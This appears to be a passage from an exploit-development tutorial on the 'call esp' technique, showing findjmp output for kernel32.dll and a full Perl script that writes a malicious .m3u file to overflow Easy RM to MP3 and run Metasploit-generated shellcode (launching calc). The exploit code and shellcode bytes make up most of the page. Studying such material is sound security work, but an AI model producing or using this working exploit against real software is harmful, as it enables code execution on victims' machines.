<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Call Reg</title>
</head><body>If a register is loaded with an address that directly points at the shellcode, then you can do a call [reg] to jump directly to the shellcode. In other words, if ESP directly points at the shellcode (so the first byte of ESP is the first byte of your shellcode), then you can overwrite EIP with the address of “call esp”, and the shellcode will be executed. This works with all registers and is quite popular because kernel32.dll contains a lot of call [reg] addresses.<br/>
<br/>
Quick example : assuming that ESP points to the shellcode : First, look for an address that contains the ‘call esp’ opcode. We’ll use findjmp :<br/>
<br/>
findjmp.exe kernel32.dll esp<br/>
<br/>
Findjmp, Eeye, I2S-LaB<br/>
Findjmp2, Hat-Squad<br/>
Scanning kernel32.dll for code useable with the esp register<br/>
0x7C836A08 &nbsp; &nbsp; &nbsp;call esp<br/>
0x7C874413 &nbsp; &nbsp; &nbsp;jmp esp<br/>
Finished Scanning kernel32.dll for code useable with the esp register<br/>
Found 2 usable addresses<br/>
<br/>
Next, write the exploit and overwrite EIP with 0x7C836A08.<br/>
<br/>
From the Easy RM to MP3 example in the first part of this tutorial series, we know that we can point ESP at the beginning of our shellcode by adding 4 characters between the place where EIP is overwritten and ESP. A typical exploit would then look like this :<br/>
<br/>
my $file= "test1.m3u";<br/>
my $junk= "A" x 26094;<br/>
<br/>
my $eip = pack('V',0x7C836A08); #overwrite EIP with call esp<br/>
<br/>
my $prependesp = "XXXX"; &nbsp;#add 4 bytes so ESP points at beginning of shellcode bytes<br/>
<br/>
my $shellcode = "\x90" x 25; &nbsp; #start shellcode with some NOPS<br/>
<br/>
# windows/exec - 303 bytes<br/>
# http://www.metasploit.com<br/>
# Encoder: x86/alpha_upper<br/>
# EXITFUNC=seh, CMD=calc<br/>
<br/>
$shellcode = $shellcode . "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .<br/>
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .<br/>
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .<br/>
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .<br/>
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .<br/>
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .<br/>
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .<br/>
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .<br/>
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .<br/>
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .<br/>
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .<br/>
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .<br/>
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .<br/>
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .<br/>
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .<br/>
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .<br/>
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .<br/>
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .<br/>
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .<br/>
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .<br/>
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .<br/>
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $junk.$eip.$prependesp.$shellcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
pwned !<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>